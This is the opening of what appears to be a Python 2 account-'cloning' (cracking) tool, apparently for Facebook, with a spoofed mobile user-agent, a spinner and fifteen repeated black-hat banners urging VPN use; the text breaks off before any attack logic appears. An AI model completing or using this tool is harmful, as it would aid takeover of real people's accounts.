#!/usr/bin/python
# -*- coding: utf-8

import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Craker.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;91m||', '\x1b[1;92m//', '\x1b[1;93m$$', '\x1b[1;94m--', '\x1b[1;95m$$', '\x1b[1;96m--', '\x1b[1;97m\\', '\x1b[1;91m||', '\x1b[1;92m//', '\x1b[1;93m$$', '\x1b[1;94m--', '\x1b[1;95m$$', '\x1b[1;96m--', '\x1b[1;97m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;95mYayanXD\x1b[1;94m:( ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)


t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} \x1b[1;93mSelamat Tinggal..'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0003)


logo = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo2 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo3 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo4 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo5 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo6 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo7 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo8 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo9 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo10 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo11 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo12 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo13 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo14 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo15 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
